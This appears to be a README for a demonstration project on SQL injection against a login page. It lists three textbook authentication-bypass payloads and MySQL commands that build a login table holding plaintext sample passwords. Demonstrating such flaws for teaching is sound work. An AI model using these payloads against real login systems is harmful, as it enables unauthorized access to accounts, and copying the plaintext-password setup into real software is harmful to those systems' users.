# SQL-Injection
This project is about demonstration of sql injection how login system can be attacked

Here Login page is present on which sql injection commands are run on it

few are:
1.)user = '- 
AND pass = '-

2.)'admin or 5=5# 
AND pass = '5

3.) user = 'or '1'='1 
    AND pass = ' or '1'='1

for MYSQL run this command

== MySQL Database ===================================

mysql> create database login;


mysql> use login;


mysql> create table login (id INT not null auto_increment primary key, user VARCHAR (20), pass VARCHAR(40));


mysql> insert into login (user,pass) values ('admin','123456');


mysql> insert into login (user,pass) values ('abhishek','abcd');


mysql> insert into login (user,pass) values ('arjun','0d107d05c71e9e9b7');
